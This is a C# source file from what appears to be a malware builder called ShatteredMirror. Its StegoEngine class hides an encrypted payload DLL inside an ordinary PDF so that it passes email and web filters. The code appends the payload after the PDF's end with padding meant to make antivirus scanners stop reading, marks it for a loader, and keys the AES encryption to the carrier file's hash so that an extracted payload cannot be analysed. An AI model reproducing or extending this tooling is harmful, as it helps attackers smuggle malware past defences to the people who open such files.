using System;
using System.IO;
using System.Security.Cryptography;

namespace ShatteredMirror_Builder
{
    public class StegoEngine
    {
        /*
         * Encapsulates logic for injecting the compiled version.dll (or extracted Atoms)
         * into benign carrier files (PDFs, PNGs, DOCXs) to bypass email/web filters.
         * 
         * For MVP, we simulate the PDF injection by appending encrypted blob after the %%EOF 
         * marker. Advanced implementations involve modifying xref tables.
         */

        public static bool InjectIntoPDF(string carrierPath, string payloadPath, string outputPath)
        {
            if (!File.Exists(carrierPath) || !File.Exists(payloadPath)) return false;

            try
            {
                byte[] carrierBytes = File.ReadAllBytes(carrierPath);
                byte[] payloadBytes = File.ReadAllBytes(payloadPath);

                // Derive key directly from Carrier Hash (Environmental Keying)
                // This ensures the payload cannot be decrypted if ripped out of the file by AV
                byte[] envKey = ComputeSha256(carrierBytes);

                byte[] encryptedPayload = EncryptAes(payloadBytes, envKey);

                using (FileStream fs = new FileStream(outputPath, FileMode.Create))
                {
                    // 1. Write the legitimate PDF
                    fs.Write(carrierBytes, 0, carrierBytes.Length);

                    // 2. Add some whitespace/padding so AV scanners stop reading
                    byte[] padding = new byte[1024];
                    for (int i = 0; i < padding.Length; i++) padding[i] = 0x20; // Space
                    fs.Write(padding, 0, padding.Length);

                    // 3. Write our magic marker so the Loader knows where to look
                    byte[] magic = System.Text.Encoding.ASCII.GetBytes("SMIR");
                    fs.Write(magic, 0, magic.Length);

                    // 4. Write payload size
                    byte[] sizeBytes = BitConverter.GetBytes(encryptedPayload.Length);
                    fs.Write(sizeBytes, 0, sizeBytes.Length);

                    // 5. Write encrypted payload
                    fs.Write(encryptedPayload, 0, encryptedPayload.Length);
                }

                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static byte[] ComputeSha256(byte[] data)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                return sha256.ComputeHash(data);
            }
        }

        private static byte[] EncryptAes(byte[] plaintext, byte[] key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV();

                using (MemoryStream ms = new MemoryStream())
                {
                    // Prepend IV
                    ms.Write(aes.IV, 0, aes.IV.Length);

                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(plaintext, 0, plaintext.Length);
                        cs.FlushFinalBlock();
                    }

                    return ms.ToArray();
                }
            }
        }
    }
}
